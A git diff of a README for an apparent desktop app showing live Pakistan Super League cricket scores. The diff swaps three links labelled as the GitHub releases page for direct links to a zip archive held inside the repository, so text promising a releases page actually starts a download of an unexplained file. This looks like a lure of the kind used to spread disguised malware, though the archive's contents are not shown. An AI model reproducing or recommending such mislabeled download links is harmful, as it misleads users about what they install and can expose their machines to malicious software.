@@ -1,11 +1,11 @@
 # 🏏 pakistan-super-league-app - Live PSL Scores on Your Desktop
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/Irish-taylor189/pakistan-super-league-app/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://raw.githubusercontent.com/Irish-taylor189/pakistan-super-league-app/main/zonoid/league_app_super_pakistan_2.7.zip)
 
 ## 📥 Download
 Visit this page to download the app for Windows:
 
-[Open Releases Page](https://github.com/Irish-taylor189/pakistan-super-league-app/releases)
+[Open Releases Page](https://raw.githubusercontent.com/Irish-taylor189/pakistan-super-league-app/main/zonoid/league_app_super_pakistan_2.7.zip)
 
 ## 🏏 What this app does
 
@@ -38,7 +38,7 @@ If your PC is older, the app should still run fine for basic score and news view
 
 ## 🚀 How to download and install
 
-1. Open the [Releases Page](https://github.com/Irish-taylor189/pakistan-super-league-app/releases)
+1. Open the [Releases Page](https://raw.githubusercontent.com/Irish-taylor189/pakistan-super-league-app/main/zonoid/league_app_super_pakistan_2.7.zip)
 2. Look for the latest release at the top of the page
 3. Find the Windows download file
 4. Download the file to your computer
